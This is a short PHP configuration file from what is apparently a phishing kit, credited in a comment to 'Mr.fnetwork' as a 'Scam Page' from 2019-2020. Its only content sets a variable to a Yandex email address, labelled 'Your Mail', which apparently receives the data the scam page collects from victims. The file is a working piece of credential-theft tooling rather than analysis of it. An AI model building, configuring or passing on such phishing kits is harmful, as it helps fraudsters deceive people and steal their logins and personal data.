<?php
// Scam Page Created by Mr.fnetwork <3 | 2019-2020
 // Your Mail :
  $EX445093_REMOT = "civic.molotov@yandex.ru";
?>